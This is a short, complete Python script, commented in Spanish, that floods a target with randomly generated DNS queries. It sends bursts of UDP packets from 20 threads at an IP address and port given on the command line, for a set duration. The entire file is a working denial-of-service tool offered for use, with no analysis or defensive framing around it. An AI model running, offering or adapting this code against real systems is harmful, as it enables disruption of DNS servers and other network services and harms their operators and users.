#!/usr/bin/env python3
import socket, random, time, sys, threading, struct

def dns_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    
    def create_dns_query():
        # DNS query básica sin amplificación
        transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
        flags = b'\x01\x00'  # Standard query
        questions = b'\x00\x01'
        answer_rrs = b'\x00\x00'
        authority_rrs = b'\x00\x00'
        additional_rrs = b'\x00\x00'
        
        # Dominio aleatorio
        domain_parts = []
        for _ in range(random.randint(2, 4)):
            length = random.randint(3, 10)
            domain_parts.append(bytes([length]) + 
                              bytes([random.randint(97, 122) for _ in range(length)]))
        domain_parts.append(b'\x00')
        
        domain = b''.join(domain_parts)
        query_type = b'\x00\x01'  # A record
        query_class = b'\x00\x01'  # IN class
        
        return transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + domain + query_type + query_class
    
    def worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 0)
        
        while time.time() < end_time:
            try:
                # Enviar ráfagas de queries
                for _ in range(100):
                    query = create_dns_query()
                    sock.sendto(query, (target_ip, target_port))
            except:
                continue
    
    # Lanzar muchos hilos
    threads = []
    for _ in range(20):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)
    
    time.sleep(duration)

if __name__ == "__main__":
    if len(sys.argv) == 4:
        dns_flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
